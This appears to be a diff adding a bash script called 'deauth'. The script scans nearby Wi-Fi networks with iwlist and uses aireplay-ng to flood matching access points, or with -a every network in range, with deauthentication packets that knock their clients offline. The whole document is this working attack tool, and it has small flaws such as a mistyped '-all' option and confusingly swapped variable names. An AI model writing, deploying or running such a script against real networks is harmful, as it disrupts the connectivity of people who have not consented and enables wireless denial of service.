@@ -1,0 +1,60 @@
+#!/bin/bash
+function usage {
+    echo "Usage: deauth [OPTION]... <BSSID>..."
+    echo "Disconnects all clients from specified wifi networks"
+    echo "    -a --all" 
+    echo "        Disconnects all clients from all networks"
+    echo "    -c --count <number>"
+    echo "        Number of deauth packets"
+    echo "    -h --help"
+    echo "        Prints this"
+    exit
+}
+essids="\(^$\)"
+COUNT=3
+while (( "$#" )); do
+    arg=$1
+    if [ "x`echo $arg | grep '^-'`" != "x" ]; then
+	case $arg in
+	  "-a" ) essids="\(\)" ;;
+	  "-all" ) essids="\(\)" ;;
+	  "-c" ) shift;COUNT=$1 ;;
+	  "--count" ) shift;COUNT=$1 ;;
+	  "-h" ) usage ;;
+	  "--help" ) usage ;;
+	  * ) echo "unrecognized option $arg"; usage
+	esac
+    else
+        arg="`echo $arg | sed 's/ /_/g'`"
+        essids=$essids"\|\($arg\)"
+    fi
+    shift
+done
+
+echo Searching for Wifi Networks...
+wifis=(`\
+          iwlist wlan0 scanning | \
+          grep "\(ESSID:\)\|\(Address:\)\|\(Channel:\)" | \
+          sed 's/Cell [0-9]\{1,\} -//g' | \
+          sed 's/^[ ]\{1,\}//g' | \
+          sed 's/^[A-Za-z ]\{1,\}:[ ]\?//g' | \
+          sed 's/ /_/g' \
+      `)
+
+echo Putting interface down...
+ifconfig wlan0 down
+
+for (( i=2; i <= ${#wifis[*]}; i+=3 )); do
+    ESSID=${wifis[$i-2]}
+    CHANNEL=${wifis[$i-1]}
+    ADDRESS=${wifis[$i]}
+    if [ "x`echo $ADDRESS | grep "$essids"`" != "x" ]; then
+        echo Setting channel
+        iwconfig wlan0 channel $CHANNEL
+        echo Deauthenticating clients from $ESSID
+        aireplay-ng -0 $COUNT -a $ESSID wlan0
+    fi
+done
+
+echo Cleaning...
+ifconfig wlan0 up
